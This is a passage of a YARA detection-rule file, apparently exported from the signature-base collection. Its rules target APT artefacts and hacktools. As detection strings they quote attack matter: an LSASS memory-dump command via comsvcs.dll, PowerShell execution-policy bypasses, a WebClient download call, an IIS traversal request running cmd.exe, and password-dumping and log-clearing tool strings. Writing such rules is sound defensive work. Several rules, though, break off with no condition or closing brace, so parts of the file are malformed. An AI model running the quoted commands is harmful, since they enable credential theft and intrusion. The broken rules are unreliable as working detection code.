		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L302-L316"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1d6ce5b3351d4b01abe0c2f614d002d4e96599b4bfa01138704a3fdf345d0786"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "MimikatzRunner"
		$s2 = "zhmimikatz"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Parviz_Developer
{
	meta:
		description = "Parviz developer known from Operation Cleaver"
		author = "Florian Roth (Nextron Systems)"
		id = "2bfa90a0-0495-5b21-98f7-5ed7ebc74b2d"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L318-L332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6ae043ee5baa7361def79811350317baf54eb76cf15001a7785808dc7947fddc"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Users\\parviz\\documents\\" nocase

	condition:
		$s1
}

rule SIGNATURE_BASE_OPCLEAVER_Ccproxy_Config
{
	meta:
		description = "CCProxy config known from Operation Cleaver"
		author = "Florian Roth (Nextron Systems)"
		id = "c4d80a2a-2a32-585e-bc20-1c5118e4ee48"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L334-L352"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6e5c1c75a499434ad6ddd2439d28ac91d500b18418e693761d0b236bf6d6ce42"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "UserName=User-001" fullword ascii
		$s2 = "Web=1" fullword ascii
		$s3 = "Mail=1" fullword ascii
		$s4 = "FTP=0" fullword ascii
		$x1 = "IPAddressLow=78.109.194.114" fullword ascii

	condition:
		all of ( $s* ) or $x1
}

rule SIGNATURE_BASE_SUSP_ELF_SPARC_Hunting_SBZ_Uniquestrings
{
	meta:
		description = "This rule is UNTESTED against a large dataset and is for hunting purposes only."
		author = "netadr, modified by Florian Roth for performance reasons"
		id = "d2f70d10-412e-5e83-ba4f-eac251012dc1"
		date = "2023-04-02"
		modified = "2023-05-08"
		reference = "https://netadr.github.io/blog/a-quick-glimpse-sbz/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp_sparc_sbz_apr23.yar#L26-L47"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bb95fc6bda0a0ed8ffc6db9734c725c487b0e70909d60119bf58d60987daaaeb"
		score = 60
		quality = 85
		tags = ""

	strings:
		$s1 = "<%u>[%s] Event #%u: "
		$s2 = "lprc:%08X" ascii fullword
		$s3 = "diuXxobB"
		$s4 = "CHM_FW"

	condition:
		2 of ( $* )
}

rule SIGNATURE_BASE_APT_RANSOM_Lockbit_Forensicartifacts_Nov23
{
	meta:
		description = "Detects patterns found in Lockbit TA attacks exploiting Citrixbleed vulnerability CVE 2023-4966"
		author = "Florian Roth"
		id = "04bde599-2a5b-5a33-a6f1-67d57a564946"
		date = "2023-11-22"
		modified = "2023-12-05"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ransom_lockbit_citrixbleed_nov23.yar#L73-L86"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6ba1d47e2cac72143c4612c420777024f114afc007c7b15251a58819654aeff1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "taskkill /f /im sqlwriter.exe /im winmysqladmin.exe /im w3sqlmgr.exe"
		$x2 = " 1> \\\\127.0.0.1\\admin$\\__"

	condition:
		1 of ( $x* )
}

rule SIGNATURE_BASE_APT28_Hospitalitymalware_Mvtband_File
{
	meta:
		description = "Yara Rule for mvtband.dll malware"
		author = "CSE CybSec Enterprise - Z-Lab"
		id = "f9e34c77-38b3-513e-bb29-148ac7058596"
		date = "2017-10-02"
		modified = "2023-12-05"
		reference = "http://csecybsec.com/download/zlab/APT28_Hospitality_Malware_report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sofacy_hospitality.yar#L20-L33"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d5da333444e7c9f023d9c6d8d1dec617859efdb26f9f6bc41e22ef27d2e3059a"
		score = 75
		quality = 85
		tags = ""
		tlp = "white"

	strings:
		$a = "DGMNOEP"
		$b = {C7 45 94 0A 25 73 30 8D 45 94}

	condition:
		all of them and pe.sections [ 2 ] . raw_data_size == 0
}

rule SIGNATURE_BASE_Nautilus_Forensic_Artificats
{
	meta:
		description = "Rule for detection of Nautilus related strings"
		author = "NCSC UK / Florian Roth"
		id = "0c0a24da-4dbc-543a-9ec0-a5b1ec75c889"
		date = "2017-11-23"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/alerts/turla-group-malware"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_turla_neuron.yar#L98-L125"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "17ae559a4640636f1285c7078a4366954d5a41c098419db32315e354f0ae619d"
		score = 60
		quality = 85
		tags = ""

	strings:
		$ = "App_Web_juvjerf3.dll" fullword ascii
		$ = "App_Web_vcplrg8q.dll" fullword ascii
		$ = "ar_all2.txt" fullword ascii
		$ = "ar_sa.txt" fullword ascii
		$ = "Convert.FromBase64String(temp[1])" fullword ascii
		$ = "D68gq#5p0(3Ndsk!" fullword ascii
		$ = "dcomnetsrv" fullword ascii
		$ = "ERRORF~1.ASP" fullword ascii
		$ = "intelliAdminRpc" fullword ascii
		$ = "J8fs4F4rnP7nFl#f" fullword ascii
		$ = "Msnb.exe" fullword ascii
		$ = "nautilus-service.dll"
		$ = "Neuron_service" fullword ascii
		$ = "owa_ar2.bat" fullword ascii
		$ = "payload.x64.dll.system" fullword ascii
		$ = "service.x64.dll.system" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_UA_Hermetic_Wiper_Artefacts_Feb22_1
{
	meta:
		description = "Detects artefacts found in Hermetic Wiper malware related intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "77f793c1-b02c-59c3-b3e4-75758f5b3b8d"
		date = "2022-02-25"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ua_hermetic_wiper.yar#L40-L70"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5e917618a5172c68b4b32ba9e63402c2a98ccb027276b317ec169a4fef219de1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sx1 = "/c powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump" ascii wide
		$sx2 = "appdata\\local\\microsoft\\windows\\winupd.log" ascii wide
		$sx3 = "AppData\\Local\\Microsoft\\Windows\\Winupd.log" ascii wide
		$sx4 = "CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1" ascii wide
		$sx5 = "\\policydefinitions\\postgresql.exe" ascii wide
		$sx6 = "powershell -v 2 -exec bypass -File text.ps1" ascii wide
		$sx7 = "powershell -exec bypass gp.ps1" ascii wide
		$sx8 = "powershell -exec bypass -File link.ps1" ascii wide
		$sx9 = " 1> \\\\127.0.0.1\\ADMIN$\\__16" ascii wide
		$sa1 = "(New-Object System.Net.WebClient).DownloadFile(" ascii wide
		$sa2 = "CSIDL_SYSTEM_DRIVE\\temp\\" ascii wide
		$sa3 = "1> \\\\127.0.0.1\\ADMIN$" ascii wide
		$fp1 = "<html" ascii

	condition:
		1 of ( $sx* ) or all of ( $sa* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_APT_UA_Hermetic_Wiper_Scheduled_Task_Feb22_1
{
	meta:
		description = "Detects scheduled task pattern found in Hermetic Wiper malware related intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "a628f773-9c71-5979-a4db-37b6b6bd6a56"
		date = "2022-02-25"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ua_hermetic_wiper.yar#L72-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "56368ba1c97fe3455312b6ee86dcd1a21677f7dfa3836e76ada4b236a5b2c171"
		score = 85
		quality = 85
		tags = ""

	strings:
		$a0 = "<Task version=" ascii wide
		$sa1 = "CSIDL_SYSTEM_DRIVE\\temp" ascii wide
		$sa2 = "postgresql.exe 1> \\\\127.0.0.1\\ADMIN$" ascii wide
		$sa3 = "cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE" ascii wide

	condition:
		$a0 and 1 of ( $s* )
}

rule SIGNATURE_BASE_Windowscredentialeditor
{
	meta:
		description = "Windows Credential Editor"
		author = "Florian Roth"
		id = "1542c6e4-36b2-5272-85d0-43226869b43e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L20-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "531a0bdc893d89b1c14deee11df95b430051cef07744a15b5d606e1c5378db97"
		score = 90
		quality = 85
		tags = ""
		threat_level = 10

	strings:
		$a = "extract the TGT session key"
		$b = "Windows Credentials Editor"

	condition:
		all of them
}

rule SIGNATURE_BASE_Pwdump
{
	meta:
		description = "PwDump 6 variant"
		author = "Marc Stroebel"
		id = "e557e548-53e8-5098-93d4-8e899384e67c"
		date = "2014-04-24"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L58-L72"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a998d16f84e8689f182f6665ad165c6ff19e25d3e52acc10ca4cc6fe54ba354f"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s5 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa"
		$s6 = "Unable to query service status. Something is wrong, please manually check the st"
		$s7 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Pscan_Portscan_1
{
	meta:
		description = "PScan - Port Scanner"
		author = "F. Roth"
		id = "54997776-644b-5a72-b08c-7174b7dc7f66"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L74-L86"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c624fcdf28506b551bf7b36883d95b279a7c56322337a0acafd91205659c92cc"
		score = 50
		quality = 85
		tags = ""

	strings:
		$a = "00050;0F0M0X0a0v0}0"

rule SIGNATURE_BASE_Hacktool_Samples
{
	meta:
		description = "Hacktool"
		author = "Florian Roth"
		id = "ecacf84a-f66c-5c21-ae4b-fd9bfb5be384"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L88-L122"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0064950d88eccbe670cd1dc70861d093c7f49f8f10e984aef4cfb4bcc94e4645"
		score = 50
		quality = 83
		tags = ""

	strings:
		$a = "Unable to uninstall the fgexec service"
		$b = "Unable to set socket to sniff"
		$c = "Failed to load SAM functions"
		$d = "Dump system passwords"
		$e = "Error opening sam hive or not valid file"
		$f = "Couldn't find LSASS pid"
		$g = "samdump.dll"
		$h = "WPEPRO SEND PACKET"
		$i = "WPE-C1467211-7C89-49c5-801A-1D048E4014C4"
		$j = "Usage: unshadow PASSWORD-FILE SHADOW-FILE"
		$k = "arpspoof\\Debug"
		$l = "Success: The log has been cleared"
		$m = "clearlogs [\\\\computername"
		$n = "DumpUsers 1."
		$o = "dictionary attack with specified dictionary file"
		$p = "by Objectif Securite"
		$q = "objectif-securite"
		$r = "Cannot query LSA Secret on remote host"
		$s = "Cannot write to process memory on remote host"
		$t = "Cannot start PWDumpX service on host"
		$u = "usage: %s <system hive> <security hive>"
		$v = "username:domainname:LMhash:NThash"
		$w = "<server_name_or_ip> | -f <server_list_file> [username] [password]"
		$x = "Impersonation Tokens Available"
		$y = "failed to parse pwdump format string"
		$z = "Dumping password"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Fierce2
{
	meta:
		description = "This signature detects the Fierce2 domain scanner"
		author = "Florian Roth (Nextron Systems)"
		id = "08a72151-48c2-513b-995f-be0d5acba7dd"
		date = "2014-01-07"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L126-L139"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "05502827dd5d1903507fd1e176d518516a5c1965fb4e51ea26b1a05eb0dce3d2"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ncrack
{
	meta:
		description = "This signature detects the Ncrack brute force tool"
		author = "Florian Roth (Nextron Systems)"
		id = "c1c56ee9-7f76-5440-b0e0-86e372c53340"
		date = "2014-01-07"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L141-L154"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a42bfaefb873a10821bcc06db109d8ab20daa8c8ac0b6cfb245d2ee339f318bb"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sqlmap
{
	meta:
		description = "This signature detects the SQLMap SQL injection tool"
		author = "Florian Roth (Nextron Systems)"
		id = "55a72fe6-f82d-5d55-842f-5d7e1cfcc9fa"
		date = "2014-01-07"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L156-L169"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9c248c856c3d91a282012489b53dc9e15569e1bb1a5c9f5e3c7938f7ce0c3157"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "except SqlmapBaseException, ex:"

	condition:
		1 of them
}

rule SIGNATURE_BASE_HKTL_Portscanner_Simple_Jan14
{
	meta:
		description = "Auto-generated rule on file PortScanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3e8960ce-0428-51e1-b992-4fa09fee8520"
		date = "2025-04-14"
		modified = "2025-04-14"
		old_rule_name = "PortScanner"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L171-L183"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b381b9212282c0c650cb4b0323436c63"
		logic_hash = "c69269b227d46b5b970cfc094b3154b0a533b439b8ed492a2059025bc96d17a0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Scan Ports Every"
		$s3 = "Scan All Possible Ports!"

	condition:
		all of them
}

rule SIGNATURE_BASE_Domainscanv1_0
{
	meta:
		description = "Auto-generated rule on file DomainScanV1_0.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "94ead827-8b29-5cb5-82b6-a7ca5087bf7e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L185-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "aefcd73b802e1c2bdc9b2ef206a4f24e"
		logic_hash = "b06d902528fee5d1718d0a2984af3314e92e1ec7033c7596f9fb0e51a20eb848"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "dIJMuX$aO-EV"
		$s1 = "XELUxP\"-\\"
		$s2 = "KaR\"U'}-M,."

rule SIGNATURE_BASE_HKTL_Moorer_Port_Scanner
{
	meta:
		description = "Auto-generated rule on file MooreR Port Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5d8fb83f-bed3-53d2-bd33-2158911dc7c8"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L204-L217"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "376304acdd0b0251c8b19fea20bb6f5b"
		logic_hash = "248f437964fc6f7836f6b4c87e1f35bb1bac25a1a484cdf1a4065e7efb823b51"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Description|"
		$s3 = "soft Visual Studio\\VB9yp"
		$s4 = "adj_fptan?4"
		$s7 = "DOWS\\SyMem32\\/o"

	condition:
		all of them
}

rule SIGNATURE_BASE_Netbios_Name_Scanner
{
	meta:
		description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "03716e00-a969-5ab5-9be7-e8fc4272e40f"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L219-L231"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "888ba1d391e14c0a9c829f5a1964ca2c"
		logic_hash = "19b40a283b74317fece2f5be0ee3e38227d9631eebbc7efb0ea19056b52630f1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "IconEx"
		$s2 = "soft Visual Stu"
		$s4 = "NBTScanner!y&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___Scanners_Ipscan
{
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "8360b268-3434-5142-9248-40b7a1589be9"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L233-L245"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6c1bcf0b1297689c8c4c12cc70996a75"
		logic_hash = "8da10a4536ecea889f29bb3f098518580629bf48eda88db7adfc5f61738ede25"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "WCAP;}ECTED"

rule SIGNATURE_BASE_Cgisscan_Cgiscan
{
	meta:
		description = "Auto-generated rule on file CGIScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "60bd5038-a308-55fd-85bb-2c4183f1c951"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L247-L259"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "338820e4e8e7c943074d5a5bc832458a"
		logic_hash = "5bd856a77c53616cf78d093462f8b7ca5a5fb0924406a02941d86bdb015a1fbc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Wang Products" fullword wide
		$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
		$s3 = "tcp is the only protocol supported thru socks server"

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_IP_Stealing_Utilities
{
	meta:
		description = "Auto-generated rule on file IP Stealing Utilities.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3a947e9c-d707-5819-88f2-059585750048"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L261-L272"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "65646e10fb15a2940a37c5ab9f59c7fc"
		logic_hash = "38958edeee6e140e11267cdd7899ad517799dbce33ac267d51dea0f8aecfa1ee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "DarkKnight"
		$s9 = "IPStealerUtilities"

	condition:
		all of them
}

rule SIGNATURE_BASE_Superscan4
{
	meta:
		description = "Auto-generated rule on file SuperScan4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "bd353382-ffa2-56c5-b842-1ffc94d6849e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L274-L287"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "78f76428ede30e555044b83c47bc86f0"
		logic_hash = "7f76c59e85efac5c150f783606e2a9bdc8724c6afd9f9c6405d63f7467c72752"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = " td class=\"summO1\">"
		$s6 = "REM'EBAqRISE"
		$s7 = "CorExitProcess'msc#e"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portracer
{
	meta:
		description = "Auto-generated rule on file PortRacer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "54717938-2f4c-5442-b0ad-40b9acd1101a"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L288-L300"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2834a872a0a8da5b1be5db65dfdef388"
		logic_hash = "f6ad85a8970b10e25becca76e17bff30cbc787ed45f331af4ecf9563ff11b65d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Auto Scroll BOTH Text Boxes"
		$s4 = "Start/Stop Portscanning"
		$s6 = "Auto Save LogFile by pressing STOP"

	condition:
		all of them
}

rule SIGNATURE_BASE_Scanarator
{
	meta:
		description = "Auto-generated rule on file scanarator.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "dfc3ff29-03b4-58ca-bfe0-c6888fddab67"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L302-L312"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "848bd5a518e0b6c05bd29aceb8536c46"
		logic_hash = "9400435470c26245cd814e1e39f275eb22566d66d1a72d4f3e618a6ad11bc8d9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"

	condition:
		all of them
}

rule SIGNATURE_BASE_Aolipsniffer
{
	meta:
		description = "Auto-generated rule on file aolipsniffer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "f7cc0f31-6ba4-504b-82de-0334257b8a95"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L314-L332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "51565754ea43d2d57b712d9f0a3e62b8"
		logic_hash = "e627b8ea85e4325714c98e93ad6147adfa600af548a80dce8548b7f5743733b5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
		$s1 = "dwGetAddressForObject"
		$s2 = "Color Transfer Settings"
		$s3 = "FX Global Lighting Angle"
		$s4 = "Version compatibility info"
		$s5 = "New Windows Thumbnail"
		$s6 = "Layer ID Generator Base"
		$s7 = "Color Halftone Settings"
		$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"

	condition:
		all of them
}

rule SIGNATURE_BASE__Bitchin_Threads_
{
	meta:
		description = "Auto-generated rule on file =Bitchin Threads=.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3a51e76c-b360-5f10-961c-ecc3ea3fa3c9"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L334-L345"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
		logic_hash = "f43fec37d9dc668b562838465e5696e502c638b207e7af6a77fac5a8b00e92a8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "DarKPaiN"
		$s1 = "=BITCHIN THREADS"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cgis4_Cgis4
{
	meta:
		description = "Auto-generated rule on file cgis4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "98fbf445-b7a5-58fa-8f06-34be7321e2eb"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L347-L362"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d658dad1cd759d7f7d67da010e47ca23"
		logic_hash = "2cf3fc6447323cbefe5f5ad02271eeb4c271bb9784d2c29030858542a43fbb04"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ")PuMB_syJ"
		$s1 = "&,fARW>yR"
